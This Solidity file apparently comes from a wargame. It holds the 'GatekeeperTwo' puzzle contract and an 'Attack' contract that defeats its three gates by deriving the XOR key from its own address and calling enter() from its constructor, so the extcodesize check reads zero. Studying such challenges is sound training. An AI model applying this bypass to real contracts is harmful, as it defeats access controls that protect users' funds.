// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attack {
    GatekeeperTwo constant private target = GatekeeperTwo(0x700D90206161DB92fBEe91cd4aF7B72371089158);

    function getKey() public view returns (bytes8){
        uint64 _gateKey = ((uint64(0) - 1) ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        return bytes8(_gateKey);
    }

    function attack() public {
        bytes8 _gateKey = getKey();
        target.enter(_gateKey);
    }

    constructor() public {
        attack();
    }
}